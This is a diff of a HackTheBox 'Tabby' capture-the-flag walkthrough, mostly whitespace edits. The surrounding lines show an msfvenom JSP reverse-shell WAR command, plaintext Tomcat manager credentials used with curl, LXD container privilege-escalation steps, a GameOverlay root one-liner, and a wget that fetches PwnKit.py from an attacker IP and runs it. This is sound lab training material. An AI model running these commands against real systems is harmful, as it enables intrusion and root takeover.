@@ -31,7 +31,6 @@ Tabby is a easy difficulty Linux machine. Enumeration of the website reveals a s
 ## Nmap
 
 ```bash
-
 # Nmap 7.94SVN scan initiated Sat Dec  2 13:56:27 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80,8080 tabby.htb
 Nmap scan report for tabby.htb (10.129.38.32)
 Host is up, received user-set (0.42s latency).
@@ -60,7 +59,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sat Dec  2 13:56:55 2023 -- 1 IP address (1 host up) scanned in 27.59 seconds
 ```
 
@@ -249,6 +247,7 @@ We aren't in `manager-gui` group, but we can manage web apps manually through `/
 #### Create a war webshell
 
 > **TLDR**
+> 
 > Use `msfvenom` to quickly create a `.war` reverse shell
 > ```bash
 > msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > rev.war
@@ -258,6 +257,7 @@ We aren't in `manager-gui` group, but we can manage web apps manually through `/
 Create a JSP webshell in `war` file
 
 > **What is `war` file?**
+> 
 > A web archive (WAR) file is **a packaged web application**, it can be created by compression tools such as `tar` and `zip`
 {: .prompt-info }
 
@@ -296,6 +296,7 @@ OK - Deployed application at context path [/backup]
 ```
 
 > **How to Undeploy APP**
+> 
 > ```bash
 > ┌──(bravosec㉿fsociety)-[~/htb/Tabby]
 > └─$ curl http://'tomcat':'$3cureP4s5w0rd123!'@tabby.htb:8080/manager/text/undeploy?path=/backup
@@ -492,6 +493,7 @@ c1fdccc0fb858c0cdbc93c99347feef5
 `id` command gave an interesting output, the user have `lxd` group
 
 > **What are LXD/LXC?**
+> 
 > - **LXC (Linux Container)** : Virtualization software at the operating system level
 >- **LXD (Linux Container Daemon)** : A type of hypervisor specifically for containers
 >
@@ -504,23 +506,18 @@ Just follow the instructions of **Method 1** on **hacktricks**
 
 ```bash
 sudo su
-
 #Install requirements
 sudo apt update
 sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
-
 #Clone repo
 git clone https://github.com/lxc/distrobuilder
-
 #Make distrobuilder
 cd distrobuilder
 make
-
 #Prepare the creation of alpine
 mkdir -p $HOME/ContainerImages/alpine/
 cd $HOME/ContainerImages/alpine/
 wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
-
 #Create the container
 sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
 ```
@@ -647,7 +644,6 @@ Use popular privesc methods such as **Pwnkit** and **GameOverlay**
 
 ```bash
 tomcat@tabby:~$ export TD=$(mktemp -d) && cd $TD && unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);d=os.getenv("TD");os.system(f"rm -rf {d}");os.chdir("/root");os.system("/bin/sh")'
-
 # id
 uid=0(root) gid=997(tomcat) groups=997(tomcat)
 ```
@@ -660,7 +656,6 @@ uid=0(root) gid=997(tomcat) groups=997(tomcat)
 tomcat@tabby:~$ wget 10.10.16.30/PwnKit.py -O /dev/shm/p && python3 /dev/shm/p
 [+] Creating shared library for exploit code.
 [+] Calling execve()
-
 # id
 uid=0(root) gid=997(tomcat) groups=997(tomcat)
 ```
